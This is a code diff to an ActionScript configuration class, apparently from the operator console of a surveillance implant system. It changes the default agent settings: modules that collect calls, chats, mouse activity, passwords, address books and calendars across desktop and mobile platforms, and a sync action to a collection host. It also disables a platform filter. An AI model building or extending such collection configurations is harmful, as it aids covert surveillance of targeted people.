@@ -9,15 +9,14 @@ package it.ht.rcs.console.operations.view.configuration
     
     private static var agent:Agent;
     
-    public static function getNewConfig(a:Agent):Object
+    public static function getDefaultConfig(a:Agent):Object
     {
       agent = a;
       
       var config:Object = {};
       config.modules = getModules();
-      config.events = [{desc: "SCREENSHOT", delay: 30}];
-      config.actions = [{desc: "STARTUP", subactions: [{action: "module", module: "call"}, {action: "module", module: "chat"}, {action: "module", module: "mouse"}] },
-                        {desc: "SYNC",    subactions: [{action: "synchronize", host: "192.168.100.100"}] }];
+      config.events  = [{desc: "SYNC", event: "timer", repeat: 0, delay: 20}];
+      config.actions = [{desc: "SYNC", subactions: [{action: "synchronize"}]}];
       config.globals = getGlobals();
       
       return config;
@@ -28,14 +27,25 @@ package it.ht.rcs.console.operations.view.configuration
       
       var modules:Array = [
         {
+          module: "addressbook",
+          _type: "desktop,mobile",
+          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+        },
+        
+        {
           module: "application",
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
         
         {
+          module: "calendar",
+          _type: "desktop,mobile",
+          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+        },
+        
+        {
           module: "call",
-          calllist: true,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -107,18 +117,6 @@ package it.ht.rcs.console.operations.view.configuration
         },
         
         {
-          module: "addressbook",
-          _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
-        },
-        
-        {
-          module: "calendar",
-          _type: "desktop,mobile",
-          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
-        },
-        
-        {
           module: "password",
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
@@ -165,7 +163,8 @@ package it.ht.rcs.console.operations.view.configuration
     
     private static function moduleFilterFunction(item:Object):Boolean
     {
-      return item._type.indexOf(agent.type) != -1 && item._platform.indexOf(agent.platform) != -1;
+      //return item._type.indexOf(agent.type) != -1 && item._platform.indexOf(agent.platform) != -1;
+      return true;
     }
     
     private static function getGlobals():Object
